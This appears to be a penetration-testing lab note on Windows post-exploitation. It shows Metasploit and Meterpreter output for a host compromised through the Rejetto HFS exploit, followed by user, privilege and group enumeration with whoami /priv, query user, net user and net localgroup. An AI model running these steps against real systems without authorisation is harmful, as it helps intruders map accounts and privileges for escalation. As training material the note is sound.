# Enumerating Users & Groups - Windows

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > search logged_on

msf6 post(windows/gather/enum_logged_on_users) > set session 3
session => 3
msf6 post(windows/gather/enum_logged_on_users) > run

[*] Running module against WIN-OMCNBKR66MN (10.0.27.147)

Current Logged Users
====================

 SID                                       User
 ---                                       ----
 S-1-5-21-2563855374-3215282501-149039005  WIN-OMCNBKR66MN\Administrator
 2-500


[+] Results saved in: /root/.msf4/loot/20250729082645_default_10.0.27.147_host.users.activ_372904.txt

Recently Logged Users
=====================

 SID                                 Profile Path
 ---                                 ------------
 S-1-5-18                            C:\Windows\system32\config\systempr
                                     ofile
 S-1-5-19                            C:\Windows\ServiceProfiles\LocalSer
                                     vice
 S-1-5-20                            C:\Windows\ServiceProfiles\NetworkS
                                     ervice
 S-1-5-21-2563855374-3215282501-149  C:\Users\Administrator
 0390052-500


[+] Results saved in: /root/.msf4/loot/20250729082646_default_10.0.27.147_host.users.recen_704114.txt
[*] Post module execution completed
```

```bash
meterpreter > shell
Process 2020 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\hfs>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

# List currently loged on users
C:\hfs>query user
query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         console             1  Active      none   7/29/2025 2:41 AM

# All the account on Target
C:\hfs>net users
net users

User accounts for \\WIN-OMCNBKR66MN

-------------------------------------------------------------------------------
Administrator            Guest                    
The command completed successfully.


# More information about specific user
C:\hfs>net user administrator
net user administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/10/2020 9:10:03 AM
Password expires             Never
Password changeable          9/10/2020 9:10:03 AM
Password required            Yes
User may change password     Yes


# Groups of Users
C:\hfs>net localgroup
net localgroup

Aliases for \\WIN-OMCNBKR66MN

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators

# WHich uers are in administrators group
C:\hfs>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```


